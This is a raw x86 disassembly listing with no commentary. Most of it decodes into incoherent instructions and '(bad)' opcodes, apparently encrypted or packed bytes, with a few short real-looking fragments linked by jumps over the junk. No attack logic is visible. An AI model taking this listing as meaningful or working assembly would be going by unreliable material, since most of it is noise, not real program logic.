  408ba6:	cdq    
  408ba7:	jle    0x408c19
  408ba9:	inc    edi
  408baa:	sbb    BYTE PTR [esi+0x30],bl
  408bad:	scas   al,BYTE PTR es:[edi]
  408bae:	stos   DWORD PTR es:[edi],eax
  408baf:	outs   dx,DWORD PTR ds:[esi]
  408bb0:	cmp    DWORD PTR [eax],eax
  408bb2:	test   BYTE PTR [ebx+edx*2+0x1722a588],ch
  408bb9:	push   ecx
  408bba:	xor    al,0x6c
  408bbc:	pop    ecx
  408bbd:	or     al,0xa5
  408bbf:	sbb    eax,0xc70e1eab
  408bc4:	jge    0x408b79
  408bc6:	es sbb esp,ecx
  408bc9:	hlt    
  408bca:	jge    0x408c02
  408bcc:	ret    0xfa3
  408bcf:	or     BYTE PTR [eax],dh
  408bd1:	sahf   
  408bd2:	inc    ebx
  408bd3:	dec    ebp
  408bd4:	call   DWORD PTR [eax]
  408bd6:	push   eax
  408bd7:	call   0x2e0b:0xe4927a7
  408bde:	pop    ecx
  408bdf:	push   ds
  408be0:	fisub  WORD PTR [ecx]
  408be2:	outs   dx,BYTE PTR ds:[esi]
  408be3:	jmp    0x3dd4:0xc9fa2c43
  408bea:	popf   
  408beb:	test   BYTE PTR [esi-0x40],ch
  408bee:	out    0x98,eax
  408bf0:	dec    eax
  408bf1:	jle    0x408be5
  408bf3:	xor    dl,bh
  408bf5:	rcr    BYTE PTR [eax-0x30],cl
  408bf8:	cwde   
  408bf9:	(bad)  
  408bfa:	retf   0xc14
  408bfd:	arpl   WORD PTR [ecx+0x6f],bp
  408c00:	jne    0x408c74
  408c02:	iret   
  408c03:	xor    eax,ecx
  408c05:	pop    edi
  408c06:	nop
  408c07:	repnz out dx,eax
  408c09:	retf   0x4a61
  408c0c:	mov    dl,0x41
  408c0e:	fdivr  QWORD PTR [ebp-0xd2ef7cf]
  408c14:	out    dx,al
  408c15:	loop   0x408c49
  408c17:	xchg   esi,eax
  408c18:	push   ss
  408c19:	sbb    BYTE PTR [ebx+ebp*4-0x11],bh
  408c1d:	or     BYTE PTR [edx-0x2a1644af],cl
  408c23:	jl     0x408c58
  408c25:	or     ecx,DWORD PTR [eax+0x2ce132a0]
  408c2b:	jbe    0x408bd5
  408c2d:	lods   al,BYTE PTR ds:[esi]
  408c2e:	in     al,dx
  408c2f:	loop   0x408c26
  408c31:	pop    ebp
  408c32:	push   0x20
  408c34:	pusha  
  408c35:	push   ebp
  408c36:	ret    
  408c37:	loopne 0x408bed
  408c39:	lock inc eax
  408c3b:	outs   dx,BYTE PTR ds:[esi]
  408c3c:	test   BYTE PTR [ebp+0x55],0x20
  408c40:	enter  0x37f2,0xd3
  408c44:	test   BYTE PTR [edi],bh
  408c46:	pop    DWORD PTR [ebx+0xfdd55e]
  408c4c:	aad    0xdb
  408c4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c4f:	stos   DWORD PTR es:[edi],eax
  408c50:	aam    0x9e
  408c52:	push   ecx
  408c53:	ds pop esp
  408c55:	mov    ch,0x10
  408c57:	mov    esi,0x670aa55f
  408c5c:	mov    ss,esi
  408c5e:	inc    esi
  408c5f:	stos   BYTE PTR es:[edi],al
  408c60:	les    eax,FWORD PTR [ebx]
  408c62:	xchg   dh,al
  408c64:	aad    0x8f
  408c66:	mov    gs,WORD PTR [edi]
  408c68:	cmc    
  408c69:	adc    al,0x71
  408c6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c6c:	inc    eax
  408c6d:	xchg   edi,eax
  408c6e:	imul   edi,DWORD PTR [ebx-0x37c6d561],0x39ccb343
  408c78:	test   eax,0xe0f1c0ef
  408c7d:	and    esp,DWORD PTR ds:0x7c377fc8
  408c83:	xchg   ebx,eax
  408c84:	push   0xd3f1eac0
  408c89:	in     eax,0xaf
  408c8b:	add    BYTE PTR [esi],dl
  408c8d:	add    ah,BYTE PTR [edi-0x4b0827dd]
  408c93:	mov    esp,0xc35f001e
  408c98:	dec    esp
  408c99:	add    BYTE PTR [edi],ch
  408c9b:	pop    eax
  408c9c:	xor    al,0x87
  408c9e:	dec    ebp
  408c9f:	popa   
  408ca0:	mov    ecx,0xfcb7fba1
  408ca5:	(bad)  
  408ca6:	adc    al,0x32
  408ca8:	ins    DWORD PTR es:[edi],dx
  408ca9:	aad    0x15
  408cab:	push   cs
  408cac:	or     ebx,0xffffffd5
  408caf:	nop
  408cb0:	xchg   ecx,eax
  408cb1:	dec    ebx
  408cb2:	push   edi
  408cb3:	mov    ds:0xbba2d1e5,al
  408cb8:	sub    eax,0xdab43ccd
  408cbd:	cli    
  408cbe:	xchg   esp,eax
  408cbf:	jge    0x408c43
  408cc1:	fistp  DWORD PTR [esi+eax*1+0x38]
  408cc5:	mov    cl,0xd
  408cc7:	lahf   
  408cc8:	in     eax,0xd8
  408cca:	dec    ebx
  408ccb:	jo     0x408d3c
  408ccd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cce:	inc    edx
  408ccf:	iret   
  408cd0:	dec    eax
  408cd1:	mov    al,ds:0x3d1af7b7
  408cd6:	or     BYTE PTR [ecx-0x3a2548f4],0xb
  408cdd:	fnstcw WORD PTR [ebp-0x6c]
  408ce0:	pop    ebp
  408ce1:	mov    ds:0xbe1eb520,al
  408ce6:	(bad)  
  408ce7:	ds dec ecx
  408ce9:	add    dl,BYTE PTR [eax-0x19]
  408cec:	call   FWORD PTR [ecx+0x1a]
  408cef:	fdiv   st(5),st
  408cf1:	(bad)  
  408cf2:	sbb    BYTE PTR [edx+eiz*4],cl
  408cf5:	jle    0x408c87
  408cf7:	and    dl,BYTE PTR [ebp-0x1352672c]
  408cfd:	loopne 0x408cd4
  408cff:	jns    0x408d1c
  408d01:	xor    al,ch
  408d03:	add    DWORD PTR [ebp-0x76],eax
  408d06:	lods   al,BYTE PTR ds:[esi]
  408d07:	and    bl,BYTE PTR [edi+0x31]
  408d0a:	xchg   ecx,eax
  408d0b:	in     al,dx
  408d0c:	sar    BYTE PTR [ecx],1
  408d0e:	jo     0x408d22
  408d10:	aas    
  408d11:	and    cl,BYTE PTR [edi]
  408d13:	loop   0x408d27
  408d15:	in     eax,dx
  408d16:	sahf   
  408d17:	jl     0x408cad
  408d19:	bound  ebx,QWORD PTR [eax-0x5612ffe3]
  408d1f:	push   ecx
  408d20:	mov    dl,0x8e
  408d22:	sbb    BYTE PTR [edi+0x43b85dba],bl
  408d28:	mov    BYTE PTR [ebp-0x18],dl
  408d2b:	sub    DWORD PTR [esi],esp
  408d2d:	xor    dh,bl
  408d2f:	sub    esp,DWORD PTR [ebp-0x688c9437]
  408d35:	mov    bl,0x1
  408d37:	sbb    eax,0x3ccfc191
  408d3c:	mov    eax,0x9c36cc3
  408d41:	or     DWORD PTR [ebp-0xf],eax
  408d44:	call   0x3ea:0x93105109
  408d4b:	xor    al,0xa8
  408d4d:	xor    DWORD PTR [ecx-0x3f0e83ce],ecx
  408d53:	mov    edi,0x135a6791
  408d58:	shl    DWORD PTR [edx-0x4fb53aad],1
  408d5e:	xor    al,0xaa
  408d60:	mov    bh,0x9b
  408d62:	pop    edi
  408d63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d64:	mov    ebp,0xa6d25c0a
  408d69:	jo     0x408db4
  408d6b:	pop    ebx
  408d6c:	xor    bl,dl
  408d6e:	loope  0x408db2
  408d70:	and    cl,cl
  408d72:	sar    BYTE PTR [esi],cl
  408d74:	xor    eax,0xef01fe48
  408d79:	inc    edx
  408d7a:	inc    ebp
  408d7b:	imul   ecx,DWORD PTR [esp+eax*4-0x8],0x20
  408d80:	pushf  
  408d81:	add    eax,0xc79b03d0
  408d86:	fwait
  408d87:	stos   BYTE PTR es:[edi],al
  408d88:	test   BYTE PTR [esi-0x625774d2],ch
  408d8e:	push   esi
  408d8f:	xor    edi,DWORD PTR ss:[eax-0xc]
  408d93:	iret   
  408d94:	mov    edx,DWORD PTR [ebp-0xc]
  408d97:	xor    edx,eax
  408d99:	add    edx,DWORD PTR [ebp-0x14]
  408d9c:	mov    edi,DWORD PTR [ebp-0x1c]
  408d9f:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  408da6:	mov    BYTE PTR [ebp+0xb],dl
  408da9:	jmp    0x408fbd
  408dae:	bound  ebp,QWORD PTR [ebx-0xa]
  408db1:	popf   
  408db2:	cmc    
  408db3:	mov    eax,ds:0xc8827371
  408db8:	cdq    
  408db9:	ins    BYTE PTR es:[edi],dx
  408dba:	das    
  408dbb:	enter  0xf32,0x93
  408dbf:	fidiv  WORD PTR [eax+0x70]
  408dc2:	imul   edi,DWORD PTR [edi+0x70],0xa10c5f70
  408dc9:	sub    edi,DWORD PTR [edx-0x2f]
  408dcc:	xor    cl,bl
  408dce:	jae    0x408d75
  408dd0:	imul   ebp,DWORD PTR [esi+0x1c38b58d],0x31573c4f
  408dda:	sub    DWORD PTR [ecx],edi
  408ddc:	add    DWORD PTR [ecx-0x3f],eax
  408ddf:	and    ecx,0x667fac9b
  408de5:	stos   BYTE PTR es:[edi],al
  408de6:	gs cmp al,0x81
  408de9:	dec    esp
  408dea:	mov    eax,ds:0x3356c85f
  408def:	or     cl,BYTE PTR [eax]
  408df1:	ret    0x982f
  408df4:	pop    esi
  408df5:	xor    DWORD PTR [eax+eiz*2+0x4b],edi
  408df9:	and    DWORD PTR [ecx-0x2e19e353],edi
  408dff:	mov    al,ds:0x2d0bb09e
  408e04:	pop    edx
  408e05:	sbb    eax,0xb8b1e196
  408e0a:	dec    ecx
  408e0b:	imul   edx,DWORD PTR [ebx],0xd806457d
  408e11:	and    ecx,edi
  408e13:	jecxz  0x408de9
  408e15:	xor    eax,0xf90d6812
  408e1a:	push   ss
  408e1b:	(bad)  
  408e1d:	adc    edi,DWORD PTR [ebp-0x51]
  408e20:	pop    ss
  408e21:	enter  0x146f,0x35
  408e25:	ror    esp,0xc
  408e28:	loope  0x408db9
  408e2a:	inc    ebp
  408e2b:	sub    ch,dh
  408e2d:	cdq    
  408e2e:	xor    BYTE PTR [ebx+eax*1+0x70e41320],bh
  408e35:	in     al,0xb4
  408e37:	pop    ebp
  408e38:	out    0x64,eax
  408e3a:	jg     0x408e80
  408e3c:	inc    esi
  408e3d:	je     0x408e1c
  408e3f:	outs   dx,DWORD PTR ds:[esi]
  408e40:	push   edx
  408e41:	and    al,0x49
  408e43:	fcom   QWORD PTR [edx+eax*2]
  408e46:	fcom   DWORD PTR [ecx]
  408e48:	cmp    edx,DWORD PTR ds:0xfdfe5bdd
  408e4e:	(bad)  
  408e50:	add    BYTE PTR [ecx-0x9e4d554],dl
  408e56:	xchg   edx,eax
  408e57:	pop    ecx
  408e58:	fisttp WORD PTR [ebx-0x1e]
  408e5b:	sbb    ebp,esi
  408e5d:	test   al,0xa
  408e5f:	adc    al,BYTE PTR [ebp+0x48]
  408e62:	add    DWORD PTR [ecx+edi*4],ebx
  408e65:	pop    ecx
  408e66:	sub    esi,DWORD PTR [esi+0x5ef60763]
  408e6c:	add    al,0x9c
  408e6e:	dec    eax
  408e6f:	push   esi
  408e70:	fs into 
  408e72:	jb     0x408e73
  408e74:	or     DWORD PTR [esi+0x7c],edx
  408e77:	pop    esp
  408e78:	adc    ebp,DWORD PTR [eax]
  408e7a:	xchg   ebp,eax
  408e7b:	adc    ecx,ebx
  408e7d:	cdq    
  408e7e:	sar    DWORD PTR [eax+eax*1+0x7b42e913],cl
  408e85:	fisttp WORD PTR [edx+0x13]
  408e88:	rep ins BYTE PTR es:[edi],dx
  408e8a:	jae    0x408eea
  408e8c:	adc    BYTE PTR [edi-0x14d1d313],dh
  408e92:	test   al,0xda
  408e94:	and    cl,BYTE PTR [ebx-0x7d]
  408e97:	sub    DWORD PTR [ebx],0x15
  408e9a:	jl     0x408efb
  408e9c:	sbb    eax,DWORD PTR [ecx+0x7a]
  408e9f:	mov    BYTE PTR [ecx+eax*8-0x12],bh
  408ea3:	ret    0xecc3
  408ea6:	mov    cl,0xa2
  408ea8:	fld    QWORD PTR [edi+0x66]
  408eab:	aas    
  408eac:	fimul  DWORD PTR [edi]
  408eae:	jecxz  0x408efa
  408eb0:	stos   BYTE PTR es:[edi],al
  408eb1:	mov    ebx,0x4c15d503
  408eb6:	dec    ebp
  408eb7:	and    esi,ebp
  408eb9:	jl     0x408ee5
  408ebb:	add    ecx,DWORD PTR [esi+0x42e7fadf]
  408ec1:	mov    ds:0xadba08e8,al
  408ec6:	loope  0x408eac
  408ec8:	je     0x408f27
  408eca:	out    0x5,al
  408ecc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ecd:	out    dx,eax
  408ece:	dec    ebp
  408ecf:	push   eax
  408ed0:	cdq    
  408ed1:	ret    
  408ed2:	dec    edi
  408ed3:	xchg   ecx,eax
  408ed4:	adc    al,0x22
  408ed6:	sub    eax,DWORD PTR [eax-0x72026d29]
  408edc:	jo     0x408e77
  408ede:	mov    al,ds:0x4b29168e
  408ee3:	inc    ebp
  408ee4:	pop    esi
  408ee5:	cli    
  408ee6:	shl    DWORD PTR [edi+0x3f],cl
  408ee9:	and    dl,al
  408eeb:	xchg   DWORD PTR [eax+0x52],ebx
  408eee:	mov    esp,0x2b64bec2
  408ef3:	or     al,BYTE PTR [ebx+0x1b]
  408ef6:	mov    bh,0x99
  408ef8:	dec    edx
  408ef9:	ds jle 0x408ebd
  408efc:	inc    edx
  408efd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408efe:	test   eax,0x261a04d9
  408f03:	les    esp,FWORD PTR [edx-0x7b4c9868]
  408f09:	sub    eax,0x5ddb30b8
  408f0e:	jge    0x408f57
  408f10:	popf   
  408f11:	pushf  
  408f12:	shr    al,cl
  408f14:	leave  
  408f15:	ss push ecx
  408f17:	cwde   
  408f18:	jmp    0xbe6f703
  408f1d:	in     al,dx
  408f1e:	std    
  408f1f:	pusha  
  408f20:	ds and bh,ah
  408f23:	sbb    ah,BYTE PTR [ebp+ecx*8+0x74563e11]
  408f2a:	pushf  
  408f2b:	jne    0x408f9f
  408f2d:	pop    ecx
  408f2e:	or     eax,0x925b721e
  408f33:	leave  
  408f34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f35:	xchg   esi,eax
  408f36:	inc    BYTE PTR [ecx+0x6e6bb0d3]
  408f3c:	mov    ds:0xed5a5045,al
  408f41:	jge    0x408ec7
  408f43:	aam    0xd1
  408f45:	std    
  408f46:	pop    ds
  408f47:	je     0x408f1d
  408f49:	push   esi
  408f4a:	mov    dl,BYTE PTR [ebx-0x259597c4]
  408f50:	and    DWORD PTR [ecx],ebp
  408f52:	push   cs
  408f53:	pop    edi
  408f54:	outs   dx,BYTE PTR ds:[esi]
  408f55:	outs   dx,BYTE PTR ds:[esi]
  408f56:	jne    0x408f07
  408f58:	sahf   
  408f59:	push   ss
  408f5a:	sub    ebx,esi
  408f5c:	push   edx
  408f5d:	add    eax,0x8092d92a
  408f62:	lds    eax,FWORD PTR [edi]
  408f64:	add    eax,0x3e139658
  408f69:	mov    edx,DWORD PTR [ebp-0x70768110]
  408f6f:	xor    eax,0xaee349f5
  408f74:	and    bl,BYTE PTR ds:0xc41a066b
  408f7a:	int3   
  408f7b:	bound  edx,QWORD PTR [ecx]
  408f7d:	aam    0xd7
  408f7f:	lahf   
  408f80:	mov    ah,0x40
  408f82:	pop    ecx
  408f83:	adc    ah,dl
  408f85:	sbb    cl,BYTE PTR [eax-0x4a3af72b]
  408f8b:	inc    edi
  408f8c:	rol    DWORD PTR [eax],1
  408f8e:	xlat   BYTE PTR ds:[ebx]
  408f8f:	push   0xa37c5df4
  408f94:	icebp  
  408f95:	cmp    bl,BYTE PTR [ebp-0x65f5cac9]
  408f9b:	sub    DWORD PTR [ecx+esi*4-0x1d814cb0],esp
  408fa2:	add    BYTE PTR [edx-0x47a5d5f9],ch
  408fa8:	fisubr WORD PTR [ebp+0xc]
  408fab:	lods   al,BYTE PTR ds:[esi]
  408fac:	push   ss
  408fad:	pushf  
  408fae:	mov    ds:0xf742cf1b,al
  408fb3:	in     al,dx
  408fb4:	lahf   
  408fb5:	sub    BYTE PTR ss:[edx-0x3e],ch
  408fb9:	xchg   BYTE PTR [ebx],dl
  408fbb:	inc    edx
  408fbc:	jmp    0xf47d:0x8b0f558a
  408fc3:	xor    edi,eax
  408fc5:	add    edi,DWORD PTR [ebp-0x14]
  408fc8:	mov    ebx,DWORD PTR [ebp-0x1c]
  408fcb:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  408fd2:	mov    dl,BYTE PTR [ebp+0xb]
  408fd5:	mov    edi,DWORD PTR [ebp-0x18]
  408fd8:	xor    edi,eax
  408fda:	add    edi,DWORD PTR [ebp-0x14]
  408fdd:	mov    ebx,DWORD PTR [ebp-0x1c]
  408fe0:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  408fe7:	mov    edx,DWORD PTR [ebp-0x44]
  408fea:	mov    edi,DWORD PTR [ebp-0xc]
  408fed:	xor    edx,eax
  408fef:	xor    edi,eax
  408ff1:	add    edx,ecx
  408ff3:	jmp    0x409207
  408ff8:	or     ah,bh
  408ffa:	das    
  408ffb:	mov    ?,ecx
  408ffd:	push   esi
  408ffe:	test   eax,0xbb5c4a63
  409003:	into   
  409004:	inc    eax
  409005:	xor    DWORD PTR [eax-0x8],0x7070dc8c
  40900c:	imul   edi,DWORD PTR [edi+0x70],0xfcef370
  409013:	dec    esi
  409014:	(bad)  
  409015:	jmp    0x40906e
  409017:	icebp  
  409018:	and    dh,BYTE PTR [ebp+0x6c]
  40901b:	rcl    DWORD PTR [ebx],cl
  40901d:	xor    ah,bl
  40901f:	cld    
  409020:	mov    dh,BYTE PTR [edx+0x2cbcf258]
  409026:	xchg   edi,eax
  409027:	sub    DWORD PTR [eax-0x9],0xffffffb2
  40902b:	fist   WORD PTR [eax]
  40902d:	jecxz  0x40907e
  40902f:	mov    ds:0x4d83f116,al
  409034:	sar    DWORD PTR [edi],1
  409036:	add    al,0xe7
  409038:	push   0x4a63005d
  40903d:	jns    0x40907c
  40903f:	jmp    0x676e50f7
  409044:	aam    0x1d
  409046:	out    dx,eax
  409047:	dec    ebp
  409048:	mov    bh,0xa
  40904a:	test   al,0x9c
  40904c:	xchg   ecx,eax
  40904d:	pusha  
  40904e:	and    ch,ah
  409050:	inc    ebp
  409051:	adc    DWORD PTR [esi],ebx
  409053:	jmp    0xc5663d32
  409058:	das    
  409059:	and    BYTE PTR [ecx],bh
  40905b:	pop    eax
  40905c:	jg     0x408fed
  40905e:	xchg   ebp,eax
  40905f:	(bad)  
  409060:	pop    ss
  409061:	sub    edi,edx
  409063:	push   edx
  409064:	stos   DWORD PTR es:[edi],eax
  409065:	dec    eax
  409066:	lock pop ebp
  409068:	sub    BYTE PTR [eax-0x2b948f2e],ch
  40906e:	(bad)  
  40906f:	loop   0x40901e
  409071:	inc    ebp
  409072:	push   ebx
  409073:	or     esp,DWORD PTR [ecx-0x3a1204b0]
  409079:	mov    DWORD PTR [edx-0x5cdef11b],edx
  40907f:	mov    cl,0x2d
  409081:	fstp   QWORD PTR [ebp+0x16]
  409084:	in     eax,dx
  409085:	fistp  WORD PTR [esi]
  409087:	call   0x33db:0xe0537503
  40908e:	xchg   ebp,eax
  40908f:	mov    ebx,0x8b0ca5a1
  409094:	popa   
  409095:	leave  
  409096:	jmp    0x5539:0x5141e512
  40909d:	addr16 je 0x4090fe
  4090a0:	inc    eax
  4090a1:	(bad)  
  4090a2:	pop    ds
  4090a3:	mov    dh,0x15
  4090a5:	inc    ebx
  4090a6:	inc    edi
  4090a7:	adc    ecx,DWORD PTR [edx-0x5e117453]
  4090ad:	fwait
  4090ae:	dec    edx
  4090af:	test   BYTE PTR [ecx+0x17],bh
  4090b2:	push   0x6f
  4090b4:	inc    ebp
  4090b5:	inc    ebx
  4090b6:	scas   eax,DWORD PTR es:[edi]
  4090b7:	hlt    
  4090b8:	mov    eax,ds:0x3cfa654f
  4090bd:	aaa    
  4090be:	loop   0x409115
  4090c0:	pusha  
  4090c1:	dec    esp
  4090c2:	loope  0x4090a7
  4090c4:	dec    ebp
  4090c5:	add    BYTE PTR [esi-0x33e04b36],ah
  4090cb:	cmp    esp,esp
  4090cd:	repz pop ebp
  4090cf:	xchg   ebp,eax
  4090d0:	jmp    0xd5a7:0x636694dc
  4090d7:	bsr    edx,DWORD PTR ds:0x9227d72c
  4090de:	and    BYTE PTR [edx+0x1e],ah
  4090e1:	push   ss
  4090e2:	das    
  4090e3:	and    BYTE PTR [edi-0x75],bh
  4090e6:	or     esp,esi
  4090e8:	aas    
  4090e9:	data16 scas al,BYTE PTR es:[edi]
  4090eb:	mov    ah,0xe3
  4090ed:	ss loop 0x40912b
  4090f0:	iret   
  4090f1:	data16 and cl,dh
  4090f4:	sbb    BYTE PTR [esi+0x4c9c9ff9],ch
  4090fa:	mov    al,ds:0x5a7aec5c
  4090ff:	xchg   edx,eax
  409100:	sbb    DWORD PTR [ebp+0x7b535574],esp
  409106:	neg    DWORD PTR [ebx-0x3bbd1485]
  40910c:	or     al,0xa1
  40910e:	loop   0x409127
  409110:	xor    esp,DWORD PTR [edx-0x6c]
  409113:	add    ecx,eax
  409115:	inc    esi
  409116:	fdivr  st(3),st
  409118:	cmp    DWORD PTR [esi],0x1dae55a2
  40911e:	inc    eax
  40911f:	aas    
  409120:	mov    dh,BYTE PTR [edx]
  409122:	xchg   esp,eax
  409123:	call   0xa43e:0x72483a28
  40912a:	retf   0x13c7
  40912d:	mov    ebx,0xf8297b35
  409132:	xor    eax,0xdc35ccfe
  409137:	fcmovnu st,st(6)
  409139:	outs   dx,BYTE PTR ds:[esi]
  40913a:	xor    al,0xc7
  40913c:	popa   
  40913d:	call   FWORD PTR [ebx-0x4b]
  409140:	cmp    DWORD PTR [edx],ecx
  409142:	and    dl,BYTE PTR [esi]
  409144:	jecxz  0x4091c1
  409146:	shr    ah,0xec
  409149:	fstp   DWORD PTR [edi]
  40914b:	dec    eax
  40914c:	pop    es
  40914d:	push   0x1c139e7f
  409152:	add    dh,BYTE PTR [esi-0x5b]
  409155:	retf   0xe7df
  409158:	repz jnp 0x409192
  40915b:	push   ds
  40915c:	or     ch,BYTE PTR [edx+0x3]
  40915f:	jg     0x40911f
  409161:	xor    al,0xeb
  409163:	dec    ebx
  409164:	(bad)  
  409165:	out    dx,eax
  409166:	cwde   
  409167:	(bad)  
  409168:	sti    
  409169:	xor    ebx,DWORD PTR ds:0xda64297b
  40916f:	in     eax,0x7
  409171:	fcomp  QWORD PTR [esi+0x47]
  409174:	lods   al,BYTE PTR ds:[esi]
  409175:	adc    DWORD PTR [eax-0x48],0x2c
  409179:	test   BYTE PTR [eax-0x107cdb48],bl
  40917f:	or     al,0x59
  409181:	mov    WORD PTR [ebp-0x15],cs
  409184:	addr16 pop edi
  409186:	test   eax,0x34a99246
  40918b:	shl    DWORD PTR [eax-0x72811c87],cl
  409191:	jle    0x40920f
  409193:	ins    BYTE PTR es:[edi],dx
  409194:	cmp    esi,DWORD PTR [edi-0x369545f8]
  40919a:	mov    ?,esi
  40919c:	pusha  
  40919d:	and    BYTE PTR [ecx],cl
  40919f:	ret    
  4091a0:	icebp  
  4091a1:	dec    edx
  4091a2:	adc    BYTE PTR [ebp+0x15ebd50d],bh
  4091a8:	jmp    0x409135
  4091aa:	push   ebx
  4091ab:	pop    ecx
  4091ac:	sbb    eax,0xefff0473
  4091b1:	pop    edi
  4091b2:	js     0x4091a5
  4091b4:	enter  0xad7a,0x77
  4091b8:	sbb    dh,BYTE PTR [ecx+0x48a1d46b]
  4091be:	fisub  WORD PTR [eax-0x43]
  4091c1:	es addr16 jnp 0x40922b
  4091c5:	sbb    BYTE PTR [ebx-0x6c],al
  4091c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091c9:	(bad)  
  4091ca:	daa    
  4091cb:	(bad)  
  4091cc:	call   0xeeee6a64
  4091d1:	jmp    0x3fbf152e
  4091d6:	retf   
  4091d7:	hlt    
  4091d8:	pop    edx
  4091d9:	push   ds
  4091da:	dec    ebp
  4091db:	xchg   BYTE PTR [edi+0x4],al
  4091de:	test   bh,ch
  4091e0:	arpl   WORD PTR [esi-0x7c],si
  4091e3:	imul   ecx,edx,0xffffff89
  4091e6:	mov    edi,0xb2f5d7a4
  4091eb:	pop    ecx
  4091ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091ed:	outs   dx,DWORD PTR ds:[esi]
  4091ee:	mov    ebx,0x3b2f5bf5
  4091f3:	adc    ah,BYTE PTR [ebx+0x27]
  4091f6:	inc    ebp
  4091f7:	fist   WORD PTR [eax]
  4091f9:	les    edi,FWORD PTR [esp+ebp*2]
  4091fc:	cmp    DWORD PTR [edx+0x3c],esp
  4091ff:	jmp    0x4b6:0xfaaaf19b
  409206:	pusha  
  409207:	add    edi,ecx
  409209:	jmp    0x40941d
  40920e:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  409215:	cdq    
  409216:	js     0x4091b8
  409218:	mov    ah,0x66
  40921a:	iret   
  40921b:	lods   eax,DWORD PTR ds:[esi]
  40921c:	mov    bl,0xe4
  40921e:	test   edx,ebx
  409220:	jo     0x409292
  409222:	imul   edi,DWORD PTR [edi+0x70],0xe40b9470
  409229:	lds    eax,FWORD PTR [ecx]
  40922b:	pop    edx
  40922c:	(bad)  
  40922d:	push   cs
  40922e:	push   0xaaee9cfb
  409233:	mov    cl,0xc9
  409235:	and    dl,BYTE PTR [eax+edi*2-0x4fc9a73b]
  40923c:	sbb    eax,0xee3c66f5
  409241:	gs loop 0x40927b
  409244:	cmp    DWORD PTR ds:0xee092e99,esp
  40924a:	push   ebp
  40924b:	mov    dh,bl
  40924d:	repz in eax,0x8d
  409250:	outs   dx,DWORD PTR ds:[esi]
  409251:	ins    BYTE PTR es:[edi],dx
  409252:	call   0x6b8a14cd
  409257:	sub    esi,DWORD PTR [edx-0x3eb73b51]
  40925d:	sub    BYTE PTR [ecx+0x3659a997],bh
  409263:	push   eax
  409264:	xchg   esp,eax
  409265:	mov    gs,WORD PTR [ebp+ebx*8+0x79532ed]
  40926c:	adc    edi,esi
  40926e:	and    BYTE PTR [ebx-0x3804bc81],dh
  409274:	cmc    
  409275:	push   ecx
  409276:	sbb    eax,esp
  409278:	jle    0x409252
  40927a:	jne    0x4092df
  40927c:	sub    DWORD PTR [esi],ecx
  40927e:	out    0x2d,al
  409280:	cmp    bl,BYTE PTR [esp+edi*2+0x3c]
  409284:	lahf   
  409285:	xchg   esp,eax
  409286:	imul   edx,DWORD PTR [ecx-0x59da67b0],0x111adb39
  409290:	sbb    esi,edi
  409292:	popf   
  409293:	pop    edi
  409294:	dec    ebx
  409295:	mov    cl,0xf3
  409297:	(bad)  
  409298:	dec    ebx
  409299:	ret    
  40929a:	int3   
  40929b:	mov    ch,0x71
  40929d:	stos   BYTE PTR es:[edi],al
  40929e:	je     0x409226
  4092a0:	test   eax,0x1fb49c3d
  4092a5:	hlt    
  4092a6:	test   BYTE PTR [ebx],bh
  4092a8:	jb     0x409273
  4092aa:	xchg   BYTE PTR [ebp+0x384a2163],dh
  4092b0:	xchg   BYTE PTR gs:0x99aa63d5,al
  4092b7:	dec    eax
  4092b8:	jnp    0x40923d
  4092ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092bb:	mov    eax,ds:0x791c94dc
  4092c0:	jnp    0x40925b
  4092c2:	dec    ebx
  4092c3:	pop    es
  4092c4:	jmp    0xb056:0x269eb00a
  4092cb:	xor    DWORD PTR [ecx+0x41],ecx
  4092ce:	pop    edi
  4092cf:	dec    esp
  4092d0:	jb     0x40933d
  4092d2:	push   edx
  4092d3:	lock test DWORD PTR [edx],esi
  4092d6:	push   ds
  4092d7:	in     eax,0xad
  4092d9:	jno    0x40927f
  4092db:	pushf  
  4092dc:	outs   dx,DWORD PTR ds:[esi]
  4092dd:	dec    eax
  4092de:	xchg   ecx,eax
  4092df:	xor    DWORD PTR [esi+esi*8+0x44],ebp
  4092e3:	(bad)  
  4092e4:	stos   BYTE PTR es:[edi],al
  4092e5:	pushf  
  4092e6:	out    dx,eax
  4092e7:	js     0x4092bf
  4092e9:	nop
  4092ea:	in     eax,dx
  4092eb:	push   ss
  4092ec:	inc    ebx
  4092ed:	icebp  
  4092ee:	mov    ecx,0x42cd8d4d
  4092f3:	sbb    al,0x2f
  4092f5:	cdq    
  4092f6:	dec    ecx
  4092f7:	mov    edi,DWORD PTR [edx]
  4092f9:	test   DWORD PTR [ebx-0x15],0x1730cf2c
  409300:	mov    ebp,0x65fd4623
  409305:	cmp    ch,al
  409307:	dec    edx
  409308:	pop    esp
  409309:	into   
  40930a:	stos   DWORD PTR es:[edi],eax
  40930b:	loope  0x4092e9
  40930d:	push   es
  40930e:	rcr    DWORD PTR [ecx-0x51],cl
  409311:	mov    esp,0xf6e5484e
  409316:	aad    0x2f
  409318:	(bad)  
  40931a:	loop   0x4092bd
  40931c:	push   eax
  40931d:	pop    ds
  40931e:	lods   eax,DWORD PTR ds:[esi]
  40931f:	int3   
  409320:	in     al,dx
  409321:	jnp    0x40934b
  409323:	dec    edx
  409324:	xchg   edi,eax
  409325:	fisubr WORD PTR [esi]
  409327:	sbb    al,0xc7
  409329:	ret    0x5cd3
  40932c:	cmp    DWORD PTR [edi+0x34],edi
  40932f:	inc    eax
  409330:	mov    edx,0x65f3d8f4
  409335:	xchg   DWORD PTR [eax],edi
  409337:	jo     0x4092fa
  409339:	or     BYTE PTR [esi-0x16de478a],ah
  40933f:	adc    ebp,DWORD PTR [ebx-0x35]
  409342:	cmp    ah,bh
  409344:	xor    bh,BYTE PTR [esi+0xb]
  409347:	inc    esi
